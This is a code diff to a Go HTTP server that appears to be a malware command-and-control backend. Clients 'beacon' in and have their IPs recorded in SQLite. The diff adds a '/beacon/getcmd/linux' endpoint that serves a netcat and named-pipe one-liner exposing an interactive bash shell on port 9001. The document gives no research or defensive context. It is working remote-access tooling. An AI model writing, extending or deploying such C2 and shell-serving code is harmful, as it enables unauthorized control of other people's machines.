@@ -7,6 +7,7 @@ import (
     "net"
     "strings"
     "database/sql"
+    "time"
     _ "github.com/mattn/go-sqlite3"
 )
 
@@ -66,33 +67,32 @@ func initdb() *sql.DB {
     return db
 }
 
-/// 5 min ///
-
-
 func main() {
 	db := initdb()
 	ip := getip().String()
 	defer db.Close()
-	state := "down"
 	log.Println("server started at =>",ip)
-
+	http.HandleFunc("/beacon/getcmd/linux", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/plain")
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 9001 > /tmp/f 2>/dev/null'"))
+		fmt.Println("client pulled cmd")
+	})
 	http.HandleFunc("/beacon", func(w http.ResponseWriter, r *http.Request) {
 		cliip := getreqip(r)
-		if cliip != "up" {
-			state = "down"
-			log.Println("SE2V1; client ip error => couldnt enum clients ip => no go error")
- 		} else {
-  			// beacontimer := Time.NewTimer(1 * Time.Minuites)
-       	    state = "up"
-   		}
+		// if cliip != "up" {
+		// 	log.Println("SE2V1; client ip error => couldnt enum clients ip => no go error")
+ 	    // } else {
+        //   beacontimer := Time.NewTimer(1 * Time.Minuites)
+        // }
 		fmt.Println("Request recieved <=", cliip)
-		insert := `INSERT INTO users (ip, state) VALUES (?, ?)
+		insert := `INSERT INTO users (ip) VALUES (?)
 				   ON CONFLICT(ip) DO UPDATE SET modified_at = CURRENT_TIMESTAMP;`
-    	_, err := db.Exec(insert, cliip, state)
+    	_, err := db.Exec(insert, cliip)
     	if err != nil {
         	log.Fatal("SE1V3; database error => couldnt insert data =>", err)
      	}else{
-        	log.Println("data inserted into db; success!")
+        	log.Println("data inserted into/updated db; success!")
       	}
 	})
 	log.Fatal(http.ListenAndServe(":8080", nil))
